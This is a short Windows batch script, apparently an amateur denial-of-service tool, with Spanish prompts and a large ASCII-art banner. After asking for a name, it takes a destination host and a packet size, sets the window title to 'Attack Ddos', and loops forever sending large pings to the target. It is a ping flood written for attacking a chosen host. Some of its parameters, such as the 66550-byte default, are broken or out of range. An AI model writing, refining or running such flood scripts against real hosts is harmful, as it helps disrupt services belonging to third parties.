@echo off
cls
Color 0f
:User
cls
echo opntions
echo Destination :www.ejemplo.com
echo Packet Size :66550
Echo Enter
Echo.
set user=
set /p user=
if defined user (
Echo.
Echo Bienvenido a Hell %user%
)

echo.===================================================================  
echo.888888888888888888888888888888888888888888888888888888888888888888888888888 
echo.888888888888888888888888888888888888888888888888888888888774277    72888888 
echo.8888888888888888888888888888888888888888888888077  7            77 28888888  
echo.888888888888888888888888888888888847288888747       7 7 752   5888788888888 
echo.8888888888888888887         4888887     7 4527 287   7 7777507  08708888888 
echo.8888888888888888827488   788748884  8 7221272777 777 22797  0 7440748888888  
echo.88888888888772 788 7887 88888817287    772  7241  848488557777 288888888888 
echo.8842777      7288  08888888888407  77   777 74722757777777777  788888888888 
echo.8            288     88888888887 7888880587 77 777   77 77 7728885888888888 
echo.0 84              48188888888887727 58474227 727 2857 778857774884748888888 
echo.88888           2888888888888882          7477  788882 88888150891804888888 
echo.88887          0888888888888887             5275888888558888278077180057755 
echo.8888   7      98888888888888887            77777888888888888812848088888508 
echo.88880    7298088888888888888885             7778888888888888888888884520428 
echo.8888882  78848408888888888888888772884      7788888888888888888888042222252 
echo.88888888777  78852248888888888888888881777277708888888888888888885225555444 
echo.8888888888889257          8888888888888572227728708888888888888884244000448 
echo.888888888888888            088888888888477222580288888888888888888888888888 
echo.888888888888888            888888888888802222088888888888888888888888888888 
echo.888888888888888817         888888888888884224888888888888888888888888888888 
echo.888888888888888888         888888888888888088888888888888888888888888888888 
echo.88888888888888888882      8888888888888888888888888888888888888888888888888
echo.8888888888888888888821   88888888888888888888888888888888888888888888888888
echo.88888888888888888888025  88888888888888888888888888888888888888888888888888 
echo.8888888888888888888880 8888888888888888888888888888888888888888888888888888 
echo.888888888888888888888889808888888888888888888888888888888888888888888888888 
echo.=================================================================== 




set /p d=Destination
set /p p=Packet Size
title Attack Ddos %p%
:ping
ping -t -n 66550 -l %p% %d%
goto ping
goto:User
@echo off